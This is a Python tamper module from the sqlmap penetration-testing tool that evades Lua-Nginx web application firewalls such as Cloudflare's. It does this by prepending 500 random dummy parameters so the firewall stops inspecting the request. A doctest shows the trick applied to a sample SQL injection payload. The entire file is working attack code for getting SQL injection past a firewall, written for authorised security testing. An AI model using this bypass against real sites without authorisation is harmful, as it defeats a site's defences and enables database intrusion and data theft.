#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import string
import random

from lib.core.enums import HINT
from lib.core.enums import PRIORITY
from lib.core.settings import DEFAULT_GET_POST_DELIMITER

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    LUA-Nginx WAFs Bypass (e.g. Cloudflare)

    Reference:
        * https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/

    Notes:
        * Lua-Nginx WAFs do not support processing of more than 100 parameters

    >>> random.seed(0); hints={}; payload = tamper("1 AND 2>1", hints=hints); "%s&%s" % (hints[HINT.PREPEND], payload)
    '0U=&Aq=&Fz=&Ws=&DK=&4F=&rU=&Mp=&48=&Y3=&tT=&3Q=&Dg=&AL=&47=&D1=&qX=&Ia=&Sy=&ZP=&aE=&1p=&u1=&lJ=&o7=&XB=&et=&F5=&gI=&RH=&YH=&7L=&KB=&Kx=&Js=&lL=&OD=&fU=&25=&03=&5H=&yR=&rY=&03=&K6=&JB=&O9=&4X=&fL=&EN=&0p=&Th=&nX=&uY=&gj=&Rc=&J4=&HQ=&bN=&LJ=&yw=&8c=&b7=&lh=&nX=&6b=&Ag=&qn=&Ov=&lF=&cg=&9m=&wT=&Z4=&kP=&7d=&P0=&vp=&LB=&kD=&zJ=&Ft=&wZ=&pI=&aT=&uc=&ro=&7v=&rw=&6N=&MS=&yz=&Oa=&lu=&oN=&x2=&Jz=&yR=&zP=&cB=&qj=&GE=&IU=&2E=&tC=&Y2=&Yl=&9N=&fS=&9y=&Qt=&nS=&aZ=&Gg=&hO=&2r=&8g=&0y=&fr=&CX=&1i=&GO=&v2=&rb=&cQ=&I6=&64=&cU=&RO=&S3=&Nx=&Hm=&Ka=&ju=&WS=&uM=&ck=&8r=&yI=&sD=&oc=&lG=&ey=&uz=&g4=&D0=&8v=&DR=&As=&T3=&5M=&x8=&Ne=&fU=&da=&yG=&BE=&KQ=&Aw=&9q=&WA=&wd=&1R=&3B=&Ph=&ym=&c6=&nj=&mx=&Hj=&98=&jz=&Q2=&E4=&tE=&EP=&mL=&nv=&73=&Yc=&jp=&W0=&KS=&Ye=&f1=&cn=&ca=&0u=&jO=&8F=&3F=&JQ=&XU=&9U=&4m=&HL=&ZD=&Xy=&K0=&XO=&al=&Fp=&e1=&6s=&zY=&dN=&hr=&Zd=&cz=&E1=&SP=&j9=&zL=&xc=&Dj=&cM=&Ng=&Iv=&xW=&E2=&LC=&Nu=&hQ=&MW=&h4=&X4=&2Q=&YG=&Wl=&WB=&UC=&We=&c5=&E3=&6P=&Jn=&fY=&3W=&RA=&sh=&AJ=&56=&zg=&VT=&bB=&Qb=&47=&Se=&ew=&bv=&a8=&Ye=&3m=&mP=&6h=&aw=&bL=&1l=&gv=&7i=&7w=&Ds=&67=&Nl=&9g=&Kj=&36=&Xt=&pU=&sA=&ci=&be=&eA=&IT=&iA=&Nf=&Bw=&6d=&zT=&tm=&sD=&6X=&rI=&QX=&By=&VA=&pC=&6i=&CN=&Dm=&aR=&Ma=&sV=&MH=&jR=&DQ=&Vo=&Vr=&9h=&2c=&pG=&Ky=&gp=&rU=&4K=&cX=&sv=&Gp=&5k=&zr=&GJ=&MG=&zN=&zW=&Ws=&xM=&jR=&xK=&iP=&vD=&zD=&Rt=&Od=&sU=&dM=&bD=&3a=&Ge=&1Q=&UP=&ac=&M9=&2R=&To=&Ur=&gC=&uk=&A3=&AB=&RG=&i4=&BW=&yY=&yn=&m6=&Kd=&yo=&fl=&dN=&kL=&LR=&Fr=&2v=&CN=&F7=&75=&5K=&ER=&nq=&ck=&aO=&iW=&Q8=&y5=&Cv=&g2=&Xu=&Cu=&bc=&wm=&Gl=&mP=&Tt=&1p=&vS=&c5=&eC=&Sc=&Y8=&Ch=&fg=&Vz=&4B=&eA=&UZ=&cl=&Eh=&25=&tA=&Ir=&Hm=&sB=&LH=&qo=&hW=&gT=&pr=&TO=&TF=&1h=&Oh=&Tw=&PR=&On=&Zo=&GP=&oM=&rk=&YI=&uK=&bi=&y8=&Fe=&VW=&WJ=&Rn=&TY=&Vv=&KM=&3g=&ZG=&wC=&an=&OE=&7D=&t0=&qL=&RY=&Wx=&dc=&T7=&vB=&SO=&qP=&sw=&HT=&jb=&Mb=&cn=&Oe=&d8=&A3=&nA=&wk=&u9=&Ux=&zq=&GT=&QC=&c5=&zy=&ai=&1F=&Tj=&u0=&Yp=&bY=&kW=&Qk=&e5=&LM=&Cj=&Lp=&XT=&b5=&cf=&sj=&ow=&Tz=&qE=&yt=&3I=&8V=&Jq=&QC=&Sz=&Eb=&Tc=&QK=&Wr=&Qm=&Gv=&8m=&Ju=&85=&KS=&Qv=&43=&uU=&aY=&J7=&wM=&uW=&L9=&ai=&ch=&56=&D6=&YW=&Ul=&1 AND 2>1'
    """

    hints = kwargs.get("hints", {})
    delimiter = kwargs.get("delimiter", DEFAULT_GET_POST_DELIMITER)

    hints[HINT.PREPEND] = delimiter.join("%s=" % "".join(random.sample(string.letters + string.digits, 2)) for _ in xrange(500))

    return payload
